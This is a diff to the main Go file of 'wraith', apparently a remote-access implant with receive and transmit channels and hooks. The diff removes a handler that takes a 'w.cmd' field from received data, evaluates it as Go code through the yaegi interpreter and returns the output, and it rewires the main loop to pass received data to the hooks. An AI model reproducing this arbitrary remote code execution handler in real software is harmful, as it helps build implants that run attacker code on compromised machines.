@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"os"
 	"os/signal"
 	"syscall"
@@ -10,15 +9,11 @@ import (
 	"github.com/0x1a8510f2/wraith/comms"
 	"github.com/0x1a8510f2/wraith/config"
 	"github.com/0x1a8510f2/wraith/hooks"
-	"github.com/0x1a8510f2/wraith/proto"
 
 	_ "github.com/0x1a8510f2/wraith/comms/channels/rx"
 	_ "github.com/0x1a8510f2/wraith/comms/channels/tx"
 
 	_ "github.com/0x1a8510f2/wraith/proto/parts"
-
-	"github.com/traefik/yaegi/interp"
-	"github.com/traefik/yaegi/stdlib"
 )
 
 // Useful globals
@@ -57,48 +52,13 @@ func main() {
 	// Run OnExit hooks always on exit
 	defer hooks.RunOnExit()
 
-	// Hook up command handler to OnRx event
-	hooks.OnRx.Add(func(data map[string]interface{}) (result string) {
-		// Always catch panics from this function as no error here should crash Wraith
-		defer func() {
-			if r := recover(); r != nil {
-				result = fmt.Sprintf("command execution panicked with message: %s", r)
-			}
-		}()
-
-		if cmd, ok := data["w.cmd"]; ok {
-			// Initialise yaegi to handle commands
-			i := interp.New(interp.Options{})
-			i.Use(stdlib.Symbols)
-			// The code should generate a function called "wcmd" to be executed by Wraith.
-			// That function should in turn return a string to be used as the result.
-			// If the value of the key cmd is not a string, the panic will be caught and
-			// returned as the command result.
-			_, err := i.Eval(cmd.(string))
-			if err != nil {
-				panic(err)
-			}
-			fnv, err := i.Eval("wcmd")
-			if err != nil {
-				panic(err)
-			}
-			fn, ok := fnv.Interface().(func() string)
-			if !ok {
-				panic("wcmd is not a `func() string`")
-			}
-			result = fn()
-		}
-		return
-	})
-
 	// Mainloop: Transmit, receive and process stuff
 	for {
 		// TODO: Find what is concurrent and what is not to catch points where Wraith can break/stall
 		select {
 		case rx := <-comms.UnifiedRxQueue:
-			proto.HandleData(rx.Data)
 			// When data is received, run the OnRx handlers
-			hooks.RunOnRx(map[string]interface{}{})
+			hooks.RunOnRx(rx.Data)
 		case <-exitTrigger:
 			return
 		}
